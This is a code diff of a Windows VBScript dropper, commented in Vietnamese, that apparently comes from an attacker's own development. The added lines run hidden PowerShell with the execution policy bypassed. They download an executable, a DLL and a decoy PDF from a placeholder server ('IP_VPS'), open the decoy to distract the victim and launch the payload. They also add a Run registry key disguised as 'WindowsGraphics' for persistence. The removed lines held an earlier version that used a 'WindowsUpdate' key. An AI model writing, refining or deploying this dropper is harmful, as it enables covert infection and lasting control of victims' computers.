@@ -1,13 +1,15 @@
 Set WshShell = CreateObject("WScript.Shell")
 strTemp = WshShell.ExpandEnvironmentStrings("%TEMP%")
 
-' 1. Mở file PDF mồi nhử ngay lập tức
-WshShell.Run "cmd /c start """" """ & strTemp & "\decoy.pdf""", 0, False
+' Lệnh PowerShell để tải và thực thi
+psCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
+"""$t=$env:TEMP; " & _
+"iwr 'http://IP_VPS/app.exe' -OutF '$t\app.exe'; " & _
+"iwr 'http://IP_VPS/vinh.dll' -OutF '$t\vinh.dll'; " & _
+"iwr 'http://IP_VPS/decoy.pdf' -OutF '$t\decoy.pdf'; " & _
+"Start-Process '$t\decoy.pdf'; " & _
+"Start-Process '$t\app.exe'; " & _
+"New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsGraphics' -Value '$t\app.exe' -PropertyType 'String' -Force"""
 
-' 2. Chạy app.exe ngầm
-WshShell.Run """" & strTemp & "\app.exe""", 0, False
-
-' 3. Thiết lập Persistence (Tự khởi động cùng Windows)
-' Nó sẽ ghi vào Registry để mỗi lần mở máy app.exe sẽ tự chạy
-strRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate"
-WshShell.RegWrite strRegPath, strTemp & "\app.exe", "REG_SZ"
+' Chạy lệnh trên mà không hiện cửa sổ (0)
+WshShell.Run psCommand, 0, False
